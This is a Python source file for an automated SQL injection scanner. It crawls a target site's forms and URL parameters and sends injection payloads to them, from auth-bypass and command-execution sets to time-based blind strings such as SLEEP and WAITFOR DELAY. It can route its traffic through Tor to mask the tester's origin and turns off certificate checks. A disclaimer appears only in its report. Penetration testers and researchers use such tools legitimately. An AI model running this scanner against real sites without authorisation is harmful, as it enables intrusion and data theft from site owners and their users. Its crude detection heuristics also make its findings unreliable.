import requests
from urllib.parse import urljoin, parse_qs, urlparse
from bs4 import BeautifulSoup
import argparse
import time
from typing import List, Dict, Set
import logging
import re
import signal
import socks
import socket
from sql_payloads import SQLPayloads

class SQLInjectionTester:
    def __init__(self, target_url: str, delay: float = 0, use_tor: bool = False, enable_log: bool = False):
        """
        Initialize the scanner with automated parameter detection
        """
        self.target_url = target_url
        self.parameters = set()
        self.forms = []
        self.delay = delay
        self.current_scan_info = {"parameter": None, "payload": None}
        self.session = requests.Session()
        self.enable_log = enable_log
        
        if use_tor:
            self.setup_tor_connection()
        
        # Setup logging only if enabled
        if self.enable_log:
            logging.basicConfig(
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s',
                filename='security_test_log.txt'
            )
        else:
            logging.getLogger().disabled = True

    def setup_tor_connection(self):
        """Configure connection to use Tor network with bridge configuration"""
        try:
            # Parse the target URL
            parsed_url = urlparse(self.target_url)
            host = parsed_url.hostname
            
            # Skip Tor for localhost/127.0.0.1
            if host in ('localhost', '127.0.0.1'):
                logging.warning("Cannot use Tor with localhost/127.0.0.1")
                print("\n⚠️  Warning: Cannot use Tor with localhost/127.0.0.1")
                print("    - Continuing without Tor...\n")
                return

            print("\n🌐 Setting up Tor Connection:")
            print("=" * 40)

            # Configure SOCKS proxy for Tor
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket

            # Configure session to use Tor
            self.session = requests.Session()
            self.session.proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }

            # Test connection
            try:
                print("Testing connection...")
                response = self.session.get('https://check.torproject.org', timeout=15)
                if 'Congratulations' in response.text:
                    print("✅ Successfully connected to Tor network")
                    
                    # Get current IP
                    try:
                        current_ip = self.session.get('https://api.ipify.org').text
                        print(f"✅ Current Tor IP: {current_ip}")
                    except:
                        print("⚠️  Could not verify IP address but Tor is working")
                else:
                    print("⚠️  Connected to proxy but not detecting Tor network")
                    
            except Exception as e:
                print(f"❌ Error testing Tor connection: {str(e)}")
                print("\nTroubleshooting:")
                print("1. Check if Tor service is running")
                print("2. Verify your bridge configuration")
                print("3. Try restarting Tor service")
                raise Exception("Failed to establish Tor connection")

        except Exception as e:
            logging.error(f"Failed to configure Tor: {str(e)}")
            print(f"\n❌ Error: Failed to configure Tor")
            print(f"Details: {str(e)}")
            exit(1)

    def detect_parameters(self):
        """Automatically detect input parameters from the URL and page content"""
        try:
            # Parse URL parameters
            parsed_url = urlparse(self.target_url)
            url_params = parse_qs(parsed_url.query)
            self.parameters.update(url_params.keys())

            # Get page content using session
            response = self.session.get(self.target_url, verify=False, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Find form inputs
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').upper(),
                    'inputs': []
                }
                
                for input_field in form.find_all(['input', 'textarea']):
                    input_name = input_field.get('name')
                    if input_name:
                        self.parameters.add(input_name)
                        form_data['inputs'].append({
                            'name': input_name,
                            'type': input_field.get('type', 'text')
                        })
                
                self.forms.append(form_data)

            logging.info(f"Detected parameters: {', '.join(self.parameters)}")
            logging.info(f"Detected forms: {len(self.forms)}")
            
        except Exception as e:
            logging.error(f"Error detecting parameters: {str(e)}")

    def test_parameter(self, param: str, payload: str, form: Dict = None) -> Dict:
        """Test a single parameter with a specific payload"""
        try:
            # Update current scan information
            self.current_scan_info = {
                "parameter": param,
                "payload": payload,
                "form": form["action"] if form else "URL parameter"
            }
            
            if self.delay > 0:
                time.sleep(self.delay)
                
            base_url = self.target_url
            
            # If testing a form, use its action URL and method
            if form:
                if form['action']:
                    if form['action'].startswith('/'):
                        parsed_url = urlparse(self.target_url)
                        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{form['action']}"
                    else:
                        base_url = urljoin(self.target_url, form['action'])
                
                # Prepare test data
                test_data = {input_['name']: '' for input_ in form['inputs']}
                test_data[param] = payload
                
                # Send request based on form method using session
                if form['method'] == 'POST':
                    response = self.session.post(base_url, data=test_data, verify=False, timeout=10)
                else:
                    response = self.session.get(base_url, params=test_data, verify=False, timeout=10)
            else:
                # Test URL parameter using session
                response = self.session.get(base_url, params={param: payload}, verify=False, timeout=10)
            
            # Enhanced vulnerability detection
            is_vulnerable = False
            response_text = response.text.lower()
            
            # Check response code
            if response.status_code == 200:
                # Only consider 200 responses for potential vulnerabilities
                
                # Check for SQL error messages
                sql_errors = [
                    "sql syntax",
                    "mysql",
                    "sqlite",
                    "postgresql",
                    "oracle",
                    "microsoft sql server",
                    "syntax error",
                    "unclosed quotation mark",
                    "not a valid sql statement",
                ]
                
                if any(error in response_text for error in sql_errors):
                    is_vulnerable = True
                
                # Check for successful injection indicators
                if "login successful" in response_text and "admin" in payload.lower():
                    is_vulnerable = True
                
                # Compare with baseline response
                baseline_response = self.session.get(base_url, verify=False, timeout=10)
                if len(response.text) > len(baseline_response.text) * 2:
                    is_vulnerable = True
                    
            # Consider 400 status as injection blocked (not vulnerable)
            elif response.status_code == 400:
                is_vulnerable = False
                
            return {
                'parameter': param,
                'payload': payload,
                'vulnerable': is_vulnerable,
                'response_code': response.status_code,
                'response_length': len(response.text)
            }
                
        except Exception as e:
            logging.error(f"Error testing {param} with {payload}: {str(e)}")
            return {
                'parameter': param,
                'payload': payload,
                'vulnerable': False,
                'error': str(e)
            }

    def run_injection_tests(self, test_types=['ALL']) -> List[Dict]:
        """Run SQL injection tests on all detected parameters"""
        results = []
        
        # Get payloads based on selected test types
        if 'ALL' in test_types:
            basic_payloads = SQLPayloads.get_all_payloads()
        else:
            basic_payloads = []
            for test_type in test_types:
                if hasattr(SQLPayloads, test_type):
                    basic_payloads.extend(getattr(SQLPayloads, test_type))
        
        # Print selected test types
        print("\n🔍 Selected Test Types:")
        print("=" * 40)
        if 'ALL' in test_types:
            print("Running ALL test types")
        else:
            for test_type in test_types:
                print(f"→ {test_type}")
        print("=" * 40 + "\n")
        
        total_tests = len(basic_payloads) * (len(self.parameters) + 
                        sum(len(form['inputs']) for form in self.forms))
        
        # Test each form
        tests_completed = 0
        for form in self.forms:
            for input_field in form['inputs']:
                param = input_field['name']
                logging.info(f"Testing parameter in form: {param}")
                for payload in basic_payloads:
                    result = self.test_parameter(param, payload, form)
                    results.append(result)
                    
                    # Update progress
                    tests_completed += 1
                    progress = (tests_completed / total_tests) * 100
                    print(f"\rProgress: [{('=' * int(progress/2)).ljust(50)}] {progress:.1f}%", end='')
        
        # Test URL parameters
        parsed_url = urlparse(self.target_url)
        url_params = parse_qs(parsed_url.query)
        for param in url_params:
            logging.info(f"Testing URL parameter: {param}")
            for payload in basic_payloads:
                result = self.test_parameter(param, payload)
                results.append(result)
                
                # Update progress
                tests_completed += 1
                progress = (tests_completed / total_tests) * 100
                print(f"\rProgress: [{('=' * int(progress/2)).ljust(50)}] {progress:.1f}%", end='')
        
        print("\n")  # New line after progress bar
        return results

    def time_based_test(self) -> List[Dict]:
        """Test all parameters for time-based blind SQL injection vulnerabilities"""
        results = []
        payloads = [
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END--",
            "' AND SLEEP(2)--",
            "' WAITFOR DELAY '0:0:2'--"
        ]
        
        for form in self.forms:
            for input_field in form['inputs']:
                param = input_field['name']
                for payload in payloads:
                    try:
                        start_time = time.time()
                        
                        # Send the request with time-based payload
                        result = self.test_parameter(param, payload, form)
                        
                        end_time = time.time()
                        response_time = end_time - start_time
                        
                        # If response took longer than expected, mark as vulnerable
                        result['vulnerable'] = response_time >= 2
                        result['response_time'] = response_time
                        results.append(result)
                        
                    except Exception as e:
                        logging.error(f"Error in time-based test for {param}: {str(e)}")
                        results.append({
                            'parameter': param,
                            'payload': payload,
                            'vulnerable': False,
                            'error': str(e)
                        })
        
        return results

    def generate_report(self, results: List[Dict]) -> str:
        """Generate a detailed security report with improved readability"""
        from datetime import datetime
        
        def create_separator(char="=", length=80):
            return char * length + "\n"

        report = []
        # Header
        report.append("\n🔒 SQL INJECTION SECURITY SCAN REPORT")
        report.append(create_separator())
        report.append(f"📅 Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"🎯 Target URL: {self.target_url}")
        report.append(f"🔢 Parameters Detected: {len(self.parameters)}")
        report.append(f"📝 Forms Detected: {len(self.forms)}")
        report.append(create_separator())

        # Summary Statistics
        vulnerabilities_found = sum(1 for r in results if r.get('vulnerable', False))
        report.append("\n📈 SCAN STATISTICS")
        report.append(create_separator("-"))
        report.append(f"Total Parameters Tested: {len(self.parameters)}")
        report.append(f"Total Tests Executed: {len(results)}")
        report.append(f"Potential Vulnerabilities: {vulnerabilities_found}")
        
        # Risk Assessment
        risk_level = "LOW" if vulnerabilities_found == 0 else \
                     "MEDIUM" if vulnerabilities_found < 3 else "HIGH"
        report.append(f"\n Risk Level: {risk_level}")
        report.append(create_separator())

        # Detailed Findings
        report.append("\n🔍 DETAILED FINDINGS")
        report.append(create_separator("-"))

        # Group results by parameter
        param_results = {}
        for result in results:
            param = result.get('parameter', 'unknown')
            if param not in param_results:
                param_results[param] = []
            param_results[param].append(result)

        # Report findings for each parameter
        for param, param_tests in param_results.items():
            vulnerable_tests = [t for t in param_tests if t.get('vulnerable', False)]
            
            if vulnerable_tests:  # Only show parameters with vulnerabilities
                report.append(f"\n🔢 Parameter: {param}")
                report.append(create_separator("-", 40))
                
                if vulnerable_tests:
                    report.append(f"❗ VULNERABLE - {len(vulnerable_tests)} potential vulnerabilities found")
                    
                    for idx, test in enumerate(vulnerable_tests, 1):
                        report.append(f"\n🔹 Finding #{idx}")
                        report.append(f"  Payload: {test['payload']}")
                        
                        if 'response_time' in test:
                            report.append(f"  Response Time: {test['response_time']:.2f}s")
                        
                        if 'response_length' in test:
                            report.append(f"  Response Length: {test['response_length']} bytes")
                        
                        if 'response_code' in test:
                            report.append(f"  Response Code: {test['response_code']}")
                        
                        report.append("")

        # Recommendations
        if vulnerabilities_found > 0:
            report.append("\n⚠️ DISCLAIMER")
            report.append(create_separator("-"))
            report.append("This tool is for educational and research purposes only.")
            report.append("The author is not responsible for any misuse or damage.")
            report.append("Always obtain proper authorization before security testing.")
            report.append("Use at your own risk.")

        # Footer
        report.append(create_separator())
        report.append("🔒 End of Security Report")
        report.append(f"Created by Reo-0x (https://github.com/Reo-0x)")
        report.append(f"Report generated at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

        return "\n".join(report)

def signal_handler(signum, frame):
    """Handle Ctrl+C interrupt"""
    if hasattr(signal_handler, 'scanner'):
        current_scan = signal_handler.scanner.current_scan_info
        print("\n\nScan interrupted!")
        print(f"Last scan details:")
        print(f"Parameter: {current_scan['parameter']}")
        print(f"Payload: {current_scan['payload']}")
        print(f"Location: {current_scan['form']}")
    print("\nExiting gracefully...")
    exit(0)

def main():
    parser = argparse.ArgumentParser(
        description='Automated SQL Injection Vulnerability Scanner'
    )
    parser.add_argument('--url', required=True, help='Target URL to test')
    parser.add_argument('--delay', type=float, default=0, 
                      help='Delay between requests in seconds (default: 0)')
    parser.add_argument('--tor', action='store_true',
                      help='Use Tor network for scanning')
    parser.add_argument('--type', type=int, choices=[1, 2, 3, 4, 5], default=1,
                      help='''Select test type:
                           1: All Tests (Default)
                           2: Quick Scan (Auth Bypass + Error Based)
                           3: Deep Scan (Union + Blind + Time Based)
                           4: Basic Scan (Auth Bypass + URL Encoded)
                           5: Advanced Scan (All except Time Based)''')
    parser.add_argument('--report', type=str,
                      help='Enable and specify report file name')
    parser.add_argument('--log', action='store_true',
                      help='Enable logging')
    args = parser.parse_args()

    try:
        scanner = SQLInjectionTester(args.url, args.delay, args.tor, args.log)
        signal_handler.scanner = scanner
        
        # Setup signal handler for Ctrl+C
        signal.signal(signal.SIGINT, signal_handler)
        
        # Define test types based on selection
        test_types = {
            1: ['ALL'],
            2: ['AUTH_BYPASS', 'ERROR_BASED'],
            3: ['UNION_BASED', 'BLIND', 'TIME_BASED'],
            4: ['AUTH_BYPASS', 'URL_ENCODED'],
            5: ['AUTH_BYPASS', 'UNION_BASED', 'INFO_GATHERING', 'DB_MANIPULATION', 
                'ERROR_BASED', 'BLIND', 'COMMAND_EXEC', 'URL_ENCODED', 
                'ADVANCED_LOGIC', 'NULL_BYTE', 'XML_BASED']
        }

        selected_types = test_types[args.type]
        
        print("\n🔍 Selected Scan Profile:")
        print("=" * 40)
        scan_names = {
            1: "Full Scan (All Tests)",
            2: "Quick Scan (Auth Bypass + Error Based)",
            3: "Deep Scan (Union + Blind + Time Based)",
            4: "Basic Scan (Auth Bypass + URL Encoded)",
            5: "Advanced Scan (All except Time Based)"
        }
        print(f"Running: {scan_names[args.type]}")
        print("=" * 40 + "\n")
        
        print("Detecting parameters...")
        scanner.detect_parameters()
        
        print("Running injection tests...")
        basic_results = scanner.run_injection_tests(test_types=selected_types)
        
        print("Running time-based tests...")
        time_results = scanner.time_based_test() if args.type in [1, 3] else []
        
        all_results = basic_results + time_results
        
        # Generate and display report
        report = scanner.generate_report(all_results)
        print(report)
        
        # Save report only if --report argument is provided
        if args.report:
            try:
                with open(args.report, 'w') as f:
                    f.write(report)
                print(f"\n✅ Report saved to: {args.report}")
            except Exception as e:
                print(f"\n❌ Error saving report: {str(e)}")
                
    except Exception as e:
        error_msg = f"Critical error: {str(e)}"
        print(f"Error: {str(e)}")
        if args.log:
            logging.error(error_msg)

if __name__ == "__main__":
    main()